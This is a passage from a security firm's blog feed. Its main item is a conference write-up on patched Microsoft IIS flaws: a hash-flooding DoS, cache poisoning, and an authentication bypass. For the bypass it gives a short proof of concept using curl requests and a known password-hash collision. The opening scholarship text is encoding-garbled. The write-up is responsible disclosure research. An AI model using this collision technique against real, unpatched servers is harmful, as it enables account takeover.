      &lt;li&gt;2022/10/31 ÂÖ¨Â∏ÉÂØ©Êü•ÁµêÊûúÔºå‰∏¶Â∞áÊñº 10 Ëá≥ 11 ÊúàÈñìÈ†íÁôºÁçéÂ≠∏Èáë&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Áî≥Ë´ãËæ¶Ê≥ï&lt;/strong&gt;Ôºö
    &lt;ul&gt;
      &lt;li&gt;Ë´ã‰æù‚ΩÇ‰ª∂Ê™¢Ê†∏Ë°®È†ÖÊ¨°È†ÜÂ∫èÊéíÂàóÂ∑≤ÈôÑ‚ΩÇ‰ª∂ÔºåÂΩôÊï¥ÁÇ∫‚ºÄ‰ªΩ PDF Ê™îÊ°àÔºåÂØÑ‚æÑ scholarship@devco.re„ÄÇ&lt;/li&gt;
      &lt;li&gt;‰ø°‰ª∂‰∏ªÊó®Âèä PDF Ê™îÊ°àÂêçÁ®±Ë´ãÁ¨¶Âêà‰ª•‰∏ãÊ†ºÂºèÔºö[ÂÖ®ÂúãÁçéÂ≠∏‚æ¶Áî≥Ë´ã] Â≠∏Ê†°ÂêçÁ®±_Â≠∏Ëôü_ÂßìÂêçÔºàÁØÑ‰æãÔºö[ÂÖ®ÂúãÁçéÂ≠∏‚æ¶Áî≥Ë´ã] Ëºî‰ªÅ‚º§Â≠∏_B11100000_Áéã‚º©ÁæéÔºâ„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÁî≥Ë´ã‚ºà‚æÉÊàëÊ™¢Ê†∏‰∏¶ÊñºÁî≥Ë´ã‚ºàÊ™¢Ê†∏ÂçÄÂãæÈÅ∏Â∑≤ÈôÑ‚ΩÇ‰ª∂ÔºåËã•‚ΩÇ‰ª∂‰∏ç‚øëÊàñÊú™Á¢∫ÂØ¶ÂãæÈÅ∏ÊÅï‰∏çÂèóÁêÜÁî≥Ë´ã„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÈúÄÊ™¢ÈôÑÊñá‰ª∂&lt;/strong&gt;Ôºö
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/Êà¥Â§´ÂØáÁàæÂÖ®ÂúãÁçéÂ≠∏ÈáëÁî≥Ë´ãË°®.pdf&quot;&gt;Êú¨ÁçéÂ≠∏‚æ¶Áî≥Ë´ãË°®&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Âú®Â≠∏Ë≠âÊòé&lt;/li&gt;
      &lt;li&gt;ÊúÄËøë‚ºÄÂ≠∏ÊúüÊàêÁ∏æÂñÆ&lt;/li&gt;
      &lt;li&gt;Â≠∏ÁøíË≥áË®äÂÆâÂÖ®‰πãÂãïÊ©üËàáÊ≠∑Á®ã‚ººÂæó‚ºÄÁØáÔºöÂ≠óÊï∏ 500 - 2000 Â≠ó&lt;/li&gt;
      &lt;li&gt;Ë≥áË®äÂÆâÂÖ®ÊäÄË°ìÁõ∏ÈóúÁ†îÁ©∂ÊàêÊûúÔºöËá≥Â∞ëÈ†àÂæû‰ª•‰∏ãÂÖ≠È†ÖÁõÆ‰∏≠Êìá‰∏ÄÁπ≥‰∫§ÔºåÂåÖÂê´Á†îË®éÊúÉÊäïÁ®øÁµêÊûú„ÄÅÊºèÊ¥ûÁçéÂãµË®àÁï´ÊàêÊûú„ÄÅÂº±ÈªûÁ†îÁ©∂ÊàêÊûú„ÄÅË≥áË®äÂÆâÂÖ®ÊØîË≥ΩÊàêÊûú„ÄÅË≥áÂÆâÂ∑•ÂÖ∑Á†îÁ©∂ÊàêÊûú„ÄÅÊäÄË°ìÊñáÁ´†ÁôºË°®ÊàêÊûúÁ≠â&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Á∂ìÁáüÊàêÊûúÔºöËá≥Â∞ëÈ†àÂæû‰ª•‰∏ãÂÖ©È†ÖÁõÆ‰∏≠Êìá‰∏ÄÁπ≥‰∫§ÔºåÂåÖÂê´Ê†°ÂúíË≥áÂÆâÁ§æÂúò„ÄÅÂÖ¨ÈñãË≥áÂÆâÁ§æÁæ§Á≠â&lt;/li&gt;
      &lt;li&gt;Êé®Ëñ¶ÂáΩÔºöÂ∞éÂ∏´„ÄÅÁ≥ª‰∏ª‰ªª„ÄÅÂÖ∂‰ªñÊïôÊéàÊàñÊ•≠Áïå‚ºà‚º†Êé®Ëñ¶ÂáΩÔºå‚æÑÂ∞ëÈ†àÂèñÂæóÂÖ©Â∞Å‰ª•‰∏äÊé®Ëñ¶ÂáΩ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÊîØÊåÅÊõæÁ∂ìÁöÑÊàëÂÄë---Êà¥Â§´ÂØáÁàæÁ∫åËæ¶-2022-Âπ¥Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÂäÉ&quot;&gt;ÊîØÊåÅÊõæÁ∂ìÁöÑÊàëÂÄë - Êà¥Â§´ÂØáÁàæÁ∫åËæ¶ 2022 Âπ¥Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÂäÉ&lt;/h3&gt;

&lt;p&gt;Ë∫´ÁÇ∫Ë≥áÂÆâ‰∫∫ÔºåÊàëÂÄëÂú®Â≠∏ÁîüÊôÇÊúüÊâÄÁ¥ØÁ©çÂ∞çË≥áÂÆâÁÜ±ÊÉÖÂíåÂ•ΩÂ•áÂøÉÔºåÊîØÊíêËëóÊàëÂÄë‰∏ÄË∑ØËµ∞‰æÜÔºå‰∏çÂøòÂàùË°∑Âú∞ÂçîÈò≤Âè∞ÁÅ£ÂÆâÂÖ®ÔºåÂêåÊôÇ‰πüÊúüÊúõÂèØ‰ª•Áî®‰∏ÄÈªûÂäõÈáèÁÇ∫Á§æÊúÉÂ∏∂‰æÜË≤¢ÁçªÔºåÊúüÁõºÂú®Êú™‰æÜÂèØ‰ª•Âπ´Âä©Êõ¥Â§öÁ§æÂúòÊàñÁ§æÁæ§ÁöÑÂäõÈáèÊàêÁÇ∫ÂüπÈ§äÂ∞àÊ•≠ÁöÑÈ§äÂàÜ„ÄÇ&lt;/p&gt;

&lt;p&gt;Âõ†Ê≠§Ôºå‰ªäÂπ¥Â∫¶ÊàëÂÄë‰πüÂ∞áÊåÅÁ∫åË¥äÂä©Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïÔºåÊèê‰æõÁ∂ìË≤ª‰∫àË≥áÂÆâÁõ∏Èóú‰πãÁ§æÁæ§„ÄÅÁ§æÂúòËæ¶ÁêÜÂêÑÈ†ÖÊ¥ªÂãïÔºåËóâÊ≠§Èôç‰ΩéË≥áÂÆâÁü•Ë≠òËêΩÂ∑ÆÔºåÊåÅÁ∫åÊé®Âª£Ë≥áË®äÂÆâÂÖ®ÊÑèË≠òÂèäÊäÄËÉΩÔºåÊõ¥ÈÄ≤‰∏ÄÊ≠•ÂáùËÅöÂè∞ÁÅ£Ë≥áÂÆâÁ§æÁæ§ÁöÑÂäõÈáèÔºåÂπ´Âä©Âè∞ÁÅ£ÂüπÈ§ä‰∏ã‰∏ÄÂÄã‰∏ñ‰ª£ÁöÑË≥áÂÆâ‰∫∫Êâç„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Áî≥Ë´ãË≥áÊ†º&lt;/strong&gt;ÔºöËàáË≥áÂÆâË≠∞È°åÁõ∏Èóú‰πãÁ§æÁæ§„ÄÅÁ§æÂúòÊ¥ªÂãïÔºåË´ãÁî± 1 ‰ΩçÁ§æÂúò‰ª£Ë°®‰∫∫Â°´ÂØ´Ë≥áÊñô„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Ë¥äÂä©ÈáëÈ°ç&lt;/strong&gt;Ôºö‰æùÂêÑÁ§æÂúòÊ¥ªÂãïÈúÄÊ±ÇÂèäËàáÊà¥Â§´ÂØáÁàæË®éË´ñËÄåÂÆöÔºåÊØèÊ¨°ÊúÄÈ´òË£úÂä©ÈáëÈ°çÁÇ∫Êñ∞Âè∞Âπ£ 20,000 ÂÖÉÊï¥„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Áî≥Ë´ãÊôÇÁ®ã&lt;/strong&gt;ÔºöÂ¶ÇÊ¨≤Áî≥Ë´ãÊ≠§Ë®àÁï´ÁöÑÁ§æÂúòÊàñÊ¥ªÂãïÔºåË´ãÊñº 2022/10/31 ÂâçÈÄèÈÅé‰ª•‰∏ãÈÄ£ÁµêÂ°´ÂØ´ÂàùÊ≠•Ë≥áÊñôÔºåÊàëÂÄëÊúÉÂú® 30 Êó•ÂÖßÈÄöÁü•Á¨¶ÂêàÁî≥Ë´ãË≥áÊ†ºËÄÖÊèê‰æõÈÄ≤‰∏ÄÊ≠•Ë≥áÊñôÔºå‰∏çÁ¨¶ÂêàË≥áÊ†ºËÄÖÂ∞á‰∏çÂè¶Ë°åÈÄöÁü•„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Áî≥Ë´ãÈÄ£Áµê&lt;/strong&gt;Ôºö&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot;&gt;DEVCORE 2022 Âπ¥Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë™øÊü•&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÈúÄÊèê‰æõË≥áÊñô&lt;/strong&gt;Ôºö
    &lt;ul&gt;
      &lt;li&gt;Áî≥Ë´ãË≥áÊ†ºÔºöÁî≥Ë´ã‰∫∫ÈúÄ‰ª•ÂêÑË≥áÂÆâÁ§æÁæ§ÊàñÁ§æÂúòÂêçÁæ©ÊèêÂá∫Áî≥Ë´ã„ÄÇ&lt;/li&gt;
      &lt;li&gt;ËÅØÁµ°ÈõªÂ≠êÈÉµ‰ª∂&lt;/li&gt;
      &lt;li&gt;ÊÉ≥Ë¶ÅËæ¶ÁêÜÁöÑÊ¥ªÂãïÈ°ûÂûã&lt;/li&gt;
      &lt;li&gt;ÊÉ≥Ë¶ÅËæ¶ÁêÜÁöÑÊ¥ªÂãïÊñπÂºè&lt;/li&gt;
      &lt;li&gt;Ê¥ªÂãïÁ∏ΩÈ†êÁÆó&lt;/li&gt;
      &lt;li&gt;È†êË®àÈúÄË¶ÅË¥äÂä©ÈáëÈ°ç&lt;/li&gt;
      &lt;li&gt;‰ª£Ë°®‰∫∫ÂßìÂêç„ÄÅÈÄ£Áµ°ÈõªË©±&lt;/li&gt;
      &lt;li&gt;ÂúòÈ´îÂêçÁ®±&lt;/li&gt;
      &lt;li&gt;ÂúòÈ´îÂñÆ‰ΩçÁ∂≤ÂùÄ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Ê≥®ÊÑè‰∫ãÈ†Ö&lt;/strong&gt;Ôºö
    &lt;ul&gt;
      &lt;li&gt;Áî≥Ë´ãÊ°àÂØ©Ê†∏Â∞áÁ∂ìÈÅéÊà¥Â§´ÂØáÁàæÂÖßÈÉ®ÂØ©Ê†∏Ê©üÂà∂Ôºå‰∏¶‰øùÊúâÊúÄÁµÇÊ†∏Ê±∫Ê¨ä„ÄÇ&lt;/li&gt;
      &lt;li&gt;Êú¨ÂïèÂç∑ÂÉÖ‰æõÂàùÊ≠•ÊÑèÈ°òËíêÈõÜÁî®ÈÄîÔºåÁ¨¶ÂêàÁî≥Ë´ãË≥áÊ†ºËÄÖÔºåÊà¥Â§´ÂØáÁàæÂ∞áÊñº 30 Êó•ÂÖßÈÄöÁü•Êèê‰æõÈÄ≤‰∏ÄÊ≠•Ë≥áÊñô‰æõÂØ©Ê†∏ÔºåÂÖ∂È§òÂ∞á‰∏çÂè¶Ë°åÈÄöÁü•„ÄÇ&lt;/li&gt;
      &lt;li&gt;Êà¥Â§´ÂØáÁàæ‰øùÊúâ‰øÆÊîπ„ÄÅÊö´ÂÅúÊàñÁµÇÊ≠¢Êú¨Ë¥äÂä©Ë®àÁï´‰πãÊ¨äÂà©„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2022/08/26/2022-devcore-national-cyber-security-scholarship/</link>
                <guid>https://devco.re/blog/2022/08/26/2022-devcore-national-cyber-security-scholarship</guid>
                <pubDate>Fri, 26 Aug 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Let's Dance in the Cache - Destabilizing Hash Table on Microsoft IIS</title>
                <description>&lt;p&gt;Hi, this is my fifth time speaking at &lt;a href=&quot;https://www.blackhat.com/us-22/briefings/schedule/index.html#lets-dance-in-the-cache---destabilizing-hash-table-on-microsoft-iis-27199&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://forum.defcon.org/node/241837&quot;&gt;DEFCON&lt;/a&gt;. You can get the slide copy and video there:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-22/Wednesday/US-22-Tsai-Lets-Dance-in-the-Cache-Destabilizing-Hash-Table-on-Microsoft-IIS.pdf&quot;&gt;Let‚Äôs Dance in the Cache - Destabilizing Hash Table on Microsoft IIS (slides)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#TBD&quot;&gt;Let‚Äôs Dance in the Cache - Destabilizing Hash Table on Microsoft IIS (video - TBD)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As the most fundamental Data Structure in Computer Science, Hash Table is extensively used in Computer Infrastructures, such as Operating Systems, Programming Languages, Databases, and Web Servers. Also, because of its importance, Microsoft has designed its own Hash Table algorithm from a very early stage, and applied it heavily to its web server, IIS.&lt;/p&gt;

&lt;p&gt;Since IIS does not release its source code, I guess the algorithm implementation details should be an unexplored area to discover bugs. Therefore, &lt;strong&gt;this research mainly focuses on the Hash Table implementation and its usage&lt;/strong&gt;. We also look into the Cache mechanism because most of the Hash Table usages in IIS are Cache-Related!&lt;/p&gt;

&lt;p&gt;Because most of the details are in the slides, please forgive me this time for this brief write-ups instead of a full blog.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22025&quot;&gt;CVE-2022-22025&lt;/a&gt; - Microsoft IIS Hash-Flooding DoS&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-22040&quot;&gt;CVE-2022-22040&lt;/a&gt; - Microsoft IIS Cache Poisoning Attack&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30209&quot;&gt;CVE-2022-30209&lt;/a&gt; - Microsoft IIS Authentication Bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. All vulnerabilities addressed in this blog have been reported responsibly to Microsoft and patched in July 2022.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-iis-hash-flooding-dos&quot;&gt;1. IIS Hash-Flooding DoS&lt;/h2&gt;

&lt;p&gt;It‚Äôs hard to imagine that we can still see such a classic Algorithmic Complexity Attack as Hash-Flooding Attack in IIS in 2022. Although Microsoft has configured a thread deleting outdated records every 30 seconds to mitigate the attack, we still found a key-splitting bug in the implementation to &lt;strong&gt;amplify our power by over 10 times to defeat the guardian by zero hashes&lt;/strong&gt;. Through this bug we can &lt;strong&gt;make a default installed IIS Server unresponsive&lt;/strong&gt; with about 30 connections per second!&lt;/p&gt;

&lt;p&gt;Because this bug also qualifies for the &lt;a href=&quot;https://www.microsoft.com/en-us/msrc/bounty-windows-insider-preview&quot;&gt;Windows Insider Preview Bounty Program&lt;/a&gt;, we also rewarded $30,000 for this DoS. This is the maximum bounty for the category of Denial-of-Service!&lt;/p&gt;

&lt;p&gt;You can check the full demo video here:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/VtnDkzYPNCk&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;2-iis-cache-poisoning-attack&quot;&gt;2. IIS Cache Poisoning Attack&lt;/h2&gt;

&lt;p&gt;Compared with other &lt;a href=&quot;https://portswigger.net/research/practical-web-cache-poisoning&quot;&gt;marvelous Cache Poisoning research&lt;/a&gt;, this one is relatively plain. The bug is found in the component of Output Caching, the module responsible for caching dynamic responses to reduce expensive database or filesystem access on web stacks.&lt;/p&gt;

&lt;p&gt;Output Caching uses a bad Query String parser that only takes the first occurrence as the Cache-Key when Query String keys are duplicated. This behavior is actually not a problem independently. However, it‚Äôs a trouble in the view of the whole architecture with the backend, ASP.NET. The backend concatenates the value of all repeated keys together, which leads to an inconsistency between parser behaviors. Therefore, &lt;strong&gt;a classic HTTP Parameter Pollution can make IIS cache the wrong result&lt;/strong&gt;!&lt;/p&gt;

&lt;h2 id=&quot;3-iis-authentication-bypass&quot;&gt;3. IIS Authentication Bypass&lt;/h2&gt;

&lt;p&gt;This may be the most interesting bug of this talk. LKRHash is a Hash Table algorithm designed and &lt;a href=&quot;https://patents.google.com/patent/US6578131&quot;&gt;patented&lt;/a&gt; by Microsoft in 1997. It‚Äôs based on &lt;a href=&quot;https://en.wikipedia.org/wiki/Linear_hashing&quot;&gt;Linear Hashing&lt;/a&gt; and created by &lt;a href=&quot;https://en.wikipedia.org/wiki/Paul_Larson&quot;&gt;Paul Larson&lt;/a&gt; of Microsoft Research, Murali Krishnan and George Reilly of the IIS team.&lt;/p&gt;

&lt;p&gt;LKRHash aims to build a scalable and high-concurrent Hash Table under the multithreading and multi-core environment. The creators put a lot of effort into making this implementation portable, flexible and customizable to adapt to multiple products across Microsoft. An application can define its own Table-Related functions, such as the Hash Function, the Key Extracting Function, or the Key Comparing Function. This kind of extensibility creates a bunch of opportunities for vulnerability mining. So, under this context, we cares more about the relationship between the records, the keys, and the functions.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;CLKRHashTable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CLKRHashTable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;TOKEN_CACHE&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// An identifier for debugging&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnExtractKey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// Extract key from record&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnCalcKeyHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// Calculate hash signature of key&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnEqualKeys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// Compare two keys&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pfnAddRefRecord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// AddRef in FindKey, etc&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// Bound on the average chain length.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// Initial size of hash table.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;               &lt;span class=&quot;c1&quot;&gt;// Number of subordinate hash tables.&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;                &lt;span class=&quot;c1&quot;&gt;// Allow multiple identical keys?&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Because ‚ÄúLogon‚Äù is an expensive operation, to improve the performance, IIS cached all tokens for password-based authentications, such as Basic Authentication by default, and the bug we found this time is located in the logic of the key-comparing function when a collision occurs.&lt;/p&gt;

&lt;p&gt;If a login attempt whose hash hits a key that is already in the cache, LKRHash enters the application-specific &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pfnEqualKeys&lt;/code&gt; function to determine whether the key is correct or not. The application-specific logic of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TokenCacheModule&lt;/code&gt; is as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220818/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As the logic compares several parts to make the decision, it‚Äôs weird why IIS compares the username twice.&lt;/p&gt;

&lt;p&gt;I guess the original intent was to compare the password. However, the developer copy-and-pasted the code but forgot to replace the variable name. That leads to that &lt;strong&gt;an attacker can reuse another user‚Äôs logged-in token with random passwords&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To build the smallest PoC to test your own, you can create a testing account and configure the Basic Authentication on your IIS.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# add a test account, please ensure to remove that after testing&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; net user orange test-for-CVE-2022-30209-auth-bypass /add

&lt;span class=&quot;c&quot;&gt;# the source of login is not important, this can be done outside IIS.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:test-for-CVE-2022-30209-auth-bypass&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 200 OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Under the attacker‚Äôs terminal:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# script for sanity check&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;test.py
def HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
    j &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
    &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;c &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;map&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ord, password&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
        j &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; c + &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;101&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;j&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;amp;0xffffffff
    &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;j

assert HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;test-for-CVE-2022-30209-auth-bypass&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; HashString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ZeeiJT&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# before the successful login&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:ZeeiJT&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 401 Unauthorized

&lt;span class=&quot;c&quot;&gt;# after the successful login&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-su&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;orange:ZeeiJT&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://&amp;lt;iis&amp;gt;/protected/&apos;&lt;/span&gt; | findstr HTTP
HTTP/1.1 200 OK
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the attacker can log into the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;orange&lt;/code&gt; with another password whose hash is the same as the original one.&lt;/p&gt;

&lt;p&gt;However, it‚Äôs not easy to collide the hash. The probability of each attempt is only worth 1/2^32 because the hash is a 32-Bit Integer, and the attacker has no way to know the hash of existing cache keys. It‚Äôs a ridiculous number to make exploiting this bug like playing a lottery. The only pro is that the attempt costs nothing, and you have unlimited tries!&lt;/p&gt;

&lt;p&gt;To make this bug more practical, we proposed several ways to win the lottery, such as:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Increase the odds of the collision - LKRHash combined LCGs to scramble the result to make the hash more random. However, we can lower the key space because the LCG is not one-to-one mapping under the 32-Bit Integer. There must be results that will never appear so that we can pre-compute a dictionary that excludes the password whose hash is not in the results and &lt;strong&gt;increase the success rate by 13% at least&lt;/strong&gt;!&lt;/li&gt;
  &lt;li&gt;Regain the initiative - By understanding the root cause, we brainstorm several use cases that &lt;strong&gt;can cache the token in memory forever and no longer wait for user interaction&lt;/strong&gt;, such as the IIS feature &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/developer/webapps/iis/www-authentication-authorization/understanding-identities&quot;&gt;Connect As&lt;/a&gt; or leveraging software design patterns.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We have also proved this attack works naturally on Microsoft Exchange Server. By leveraging the default activated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Active Monitoring&lt;/code&gt; service, we can enter &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HealthMailbox&lt;/code&gt;‚Äôs mailbox without passwords! This authentication-less account hijacking is useful for further exploitations such as phishing or chaining another post-auth RCE together!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20220818/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Mar 16, 2022 - We reported the IIS Cache Poisoning to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Apr 09, 2022 - We reported the IIS Hash-Flooding DoS to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Apr 10, 2022 - We reported the IIS Authentication Bypass to Microsoft through the MSRC portal.&lt;/li&gt;
  &lt;li&gt;Jul 12, 2022 - Microsoft fixed everything at July‚Äôs Patch Tuesday.&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2022/08/18/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis/</link>
                <guid>https://devco.re/blog/2022/08/18/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis</guid>
                <pubDate>Thu, 18 Aug 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2022 Á¨¨‰∫åÂ±ÜÂØ¶ÁøíÁîüË®àÁï´</title>
